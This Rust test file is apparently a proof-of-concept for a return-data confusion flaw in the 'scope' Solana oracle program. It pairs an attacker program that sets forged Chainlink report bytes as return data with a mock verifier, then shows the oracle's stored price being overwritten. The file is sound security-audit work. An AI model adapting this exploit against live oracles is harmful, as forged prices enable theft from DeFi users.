use std::str::FromStr;

use anchor_lang::{prelude::*, InstructionData, ToAccountMetas};
use chainlink_streams_report::{
    feed_id::ID as FeedID,
    report::{v3::ReportDataV3, Decode as _, Encode as _},
};
use num_bigint::BigInt;
use solana_program::{
    instruction::{AccountMeta, Instruction},
    program::set_return_data,
    pubkey::Pubkey,
    system_program,
};
use solana_program_test::{processor, ProgramTest};
use solana_sdk::{
    account::Account,
    rent::Rent,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

// Mock verifier program: returns success and does NOT write return data
fn mock_verifier_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[solana_program::account_info::AccountInfo],
    _ix_data: &[u8],
) -> solana_program::entrypoint::ProgramResult {
    Ok(())
}

// Attacker program: set_return_data with bytes provided as ix data
fn attacker_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[solana_program::account_info::AccountInfo],
    ix_data: &[u8],
) -> solana_program::entrypoint::ProgramResult {
    set_return_data(ix_data);
    Ok(())
}

fn rent_exempt_account(len: usize, owner: Pubkey) -> Account {
    Account {
        lamports: Rent::default().minimum_balance(len),
        data: vec![0u8; len],
        owner,
        executable: false,
        rent_epoch: 0,
    }
}

fn u32_le_bytes(v: u32) -> [u8; 4] {
    v.to_le_bytes()
}

#[tokio::test]
async fn chainlink_return_data_confusion_price_overwrite() {
    // Hard-coded verifier IDs from the program
    let verifier_program_id = Pubkey::from_str("Gt9S41PtjR58CbG9JhJ3J6vxesqrNAswbWYbLNTMZA3c").unwrap();
    let verifier_config_pubkey =
        Pubkey::from_str("HJR45sRiFdGncL69HVzRK4HLS2SXcVW3KeTPkp2aFmWC").unwrap();
    let access_controller_pubkey =
        Pubkey::from_str("7mSn5MoBjyRLKoJShgkep8J17ueGG8rYioVAiSg5YWMF").unwrap();

    // Build program test with: scope, mock verifier at fixed ID, attacker
    let mut pt = ProgramTest::new("scope", scope::id(), processor!(scope::entry));
    pt.add_program(
        "mock_verifier",
        verifier_program_id,
        processor!(mock_verifier_process_instruction),
    );
    let attacker_program_id = Pubkey::new_unique();
    pt.add_program(
        "attacker",
        attacker_program_id,
        processor!(attacker_process_instruction),
    );

    // Pre-create zero-copy accounts required by initialize
    let token_metadatas = Keypair::new();
    let oracle_twaps = Keypair::new();
    let oracle_prices = Keypair::new();
    let oracle_mappings = Keypair::new();

    pt.add_account(
        token_metadatas.pubkey(),
        rent_exempt_account(scope::utils::consts::TOKEN_METADATA_SIZE, scope::id()),
    );
    pt.add_account(
        oracle_twaps.pubkey(),
        rent_exempt_account(scope::utils::consts::ORACLE_TWAPS_SIZE, scope::id()),
    );
    pt.add_account(
        oracle_prices.pubkey(),
        rent_exempt_account(scope::utils::consts::ORACLE_PRICES_SIZE, scope::id()),
    );
    pt.add_account(
        oracle_mappings.pubkey(),
        rent_exempt_account(scope::utils::consts::ORACLE_MAPPING_SIZE, scope::id()),
    );

    // Add the fixed verifier addresses as existing accounts so CPI does not fail on missing accounts
    pt.add_account(
        verifier_config_pubkey,
        rent_exempt_account(0, system_program::ID),
    );
    pt.add_account(
        access_controller_pubkey,
        rent_exempt_account(0, system_program::ID),
    );

    let (mut banks_client, payer, recent_blockhash) = pt.start().await;

    // Admin for Scope initialize and update_mapping
    let admin = Keypair::new();

    // Fund admin to pay for initialize
    let fund_ix = solana_sdk::system_instruction::transfer(&payer.pubkey(), &admin.pubkey(), 2_000_000_000);
    let mut fund_tx = Transaction::new_with_payer(&[fund_ix], Some(&payer.pubkey()));
    fund_tx.partial_sign(&[&payer], recent_blockhash);
    banks_client.process_transaction(fund_tx).await.unwrap();

    // A feed name used to derive configuration
    let feed_name = String::from("TEST_FEED");
    let (configuration_pda, _bump) = scope::utils::pdas::config_pubkey(&feed_name);

    // 1) Call initialize
    let init_accounts = scope::accounts::Initialize {
        admin: admin.pubkey(),
        system_program: system_program::ID,
        configuration: configuration_pda,
        token_metadatas: token_metadatas.pubkey(),
        oracle_twaps: oracle_twaps.pubkey(),
        oracle_prices: oracle_prices.pubkey(),
        oracle_mappings: oracle_mappings.pubkey(),
    };
    let init_ix = Instruction {
        program_id: scope::id(),
        accounts: init_accounts.to_account_metas(None),
        data: scope::instruction::Initialize { feed_name: feed_name.clone() }.data(),
    };

    let mut init_tx = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
    init_tx.partial_sign(&[&payer, &admin], recent_blockhash);
    banks_client.process_transaction(init_tx).await.unwrap();

    // 2) Configure mapping at index 0 for Chainlink v3
    let feed_mapping_account = Keypair::new();
    // Confidence factor: 2% => factor 50 in little-endian; rest zeros
    let mut chainlink_v3_generic = [0u8; 20];
    chainlink_v3_generic[..4].copy_from_slice(&u32_le_bytes(50));

    // Ensure the mapping pubkey exists so runtime doesn't fail on missing account
    pt.add_account(
        feed_mapping_account.pubkey(),
        rent_exempt_account(0, system_program::ID),
    );

    // Create the mapping account so it exists in the transaction context
    let create_feed_mapping_ix = solana_sdk::system_instruction::create_account(
        &admin.pubkey(),
        &feed_mapping_account.pubkey(),
        1_000_000, // not rent-exempt, but enough to exist
        0,
        &system_program::ID,
    );

    let update_mapping_accounts = scope::accounts::UpdateOracleMapping {
        admin: admin.pubkey(),
        configuration: configuration_pda,
        oracle_mappings: oracle_mappings.pubkey(),
        price_info: Some(feed_mapping_account.pubkey()),
    };
    let update_mapping_ix = Instruction {
        program_id: scope::id(),
        accounts: update_mapping_accounts.to_account_metas(None),
        data: scope::instruction::UpdateMapping {
            token: 0u16,
            price_type: scope::oracles::OracleType::Chainlink as u8,
            twap_enabled: false,
            twap_source: 0u16,
            ref_price_index: u16::MAX,
            feed_name: feed_name.clone(),
            generic_data: chainlink_v3_generic,
        }
        .data(),
    };

    let mut upd_tx = Transaction::new_with_payer(
        &[create_feed_mapping_ix, update_mapping_ix],
        Some(&payer.pubkey()),
    );
    upd_tx.partial_sign(&[&payer, &admin, &feed_mapping_account], recent_blockhash);
    banks_client.process_transaction(upd_tx).await.unwrap();

    // 3) Craft forged Chainlink ReportDataV3 and pass via attacker ix -> set_return_data
    // Forge: price ~100, bid/ask symmetric to satisfy 2% confidence, and increasing timestamp
    let target_price = 100u128; // 100
    let scale = 10u128.pow(18);
    let price_scaled = BigInt::from(target_price) * BigInt::from(scale);
    // Use a spread under 2% to pass confidence check: bid=99.1, ask=100.9
    let bid_scaled = BigInt::from(991u128) * BigInt::from(scale / 10u128);
    let ask_scaled = BigInt::from(1009u128) * BigInt::from(scale / 10u128);
    let feed_id = FeedID(feed_mapping_account.pubkey().to_bytes());

    // observations_timestamp must be higher than default 0
    let observations_timestamp: u64 = 1_700_000_000;

    // Try to build a minimal ReportDataV3 using the crate API
    let forged_report = ReportDataV3 {
        feed_id,
        observations_timestamp: observations_timestamp as u32,
        benchmark_price: price_scaled.clone(),
        bid: bid_scaled.clone(),
        ask: ask_scaled.clone(),
        ..Default::default()
    };
    let forged_bytes = forged_report.encode();

    // Sanity: ensure decode succeeds locally (same crate API)
    let _decoded = ReportDataV3::decode(&forged_bytes).expect("local decode of forged report");

    // 4) Build the verify config PDA to pass into refresh ix accounts (not required by our mock)
    let config_pda = scope::oracles::chainlink::chainlink_streams_itf::get_config_pda(&forged_bytes);
    // Create the config PDA as a zero-sized system account so CPI account exists
    let create_config_pda_ix = solana_sdk::system_instruction::create_account(
        &admin.pubkey(),
        &config_pda,
        1_000_000,
        0,
        &system_program::ID,
    );

    // Attacker Ix (I0): write forged bytes as return data
    let attacker_ix = Instruction {
        program_id: attacker_program_id,
        accounts: vec![],
        data: forged_bytes.clone(),
    };

    // Refresh Ix (I1): call scope::refresh_chainlink_price with a random serialized report; CPI will succeed
    let refresh_accounts = scope::accounts::RefreshChainlinkPrice {
        user: admin.pubkey(),
        oracle_prices: oracle_prices.pubkey(),
        oracle_mappings: oracle_mappings.pubkey(),
        oracle_twaps: oracle_twaps.pubkey(),
        verifier_account: verifier_config_pubkey,
        access_controller: access_controller_pubkey,
        config_account: config_pda,
        verifier_program_id: verifier_program_id,
    };
    let refresh_ix = Instruction {
        program_id: scope::id(),
        accounts: refresh_accounts.to_account_metas(None),
        data: scope::instruction::RefreshChainlinkPrice {
            token: 0u16,
            serialized_chainlink_report: vec![1, 2, 3],
        }
        .data(),
    };

    // Submit combined transaction (attacker -> refresh)
    let mut tx = Transaction::new_with_payer(
        &[create_config_pda_ix, attacker_ix, refresh_ix],
        Some(&payer.pubkey()),
    );
    tx.partial_sign(&[&payer, &admin], recent_blockhash);
    banks_client.process_transaction(tx).await.unwrap();

    // 5) Read OraclePrices and assert it was updated to forged values
    let acc = banks_client
        .get_account(oracle_prices.pubkey())
        .await
        .unwrap()
        .expect("oracle_prices account");
    let data = acc.data;
    // OraclePrices layout: 32 bytes pubkey, then MAX_ENTRIES * DatedPrice (56 bytes each)
    let base = 32usize;
    let price_value = u64::from_le_bytes(data[base..base + 8].try_into().unwrap());
    let _price_exp = u64::from_le_bytes(data[base + 8..base + 16].try_into().unwrap());
    let _last_updated_slot = u64::from_le_bytes(data[base + 16..base + 24].try_into().unwrap());
    let _unix_ts = u64::from_le_bytes(data[base + 24..base + 32].try_into().unwrap());
    let obs_bytes = &data[base + 32..base + 40];

    assert!(price_value > 0, "price should be non-zero");
    assert_eq!(obs_bytes, &observations_timestamp.to_le_bytes(), "observations ts should match forged value in generic_data");
}

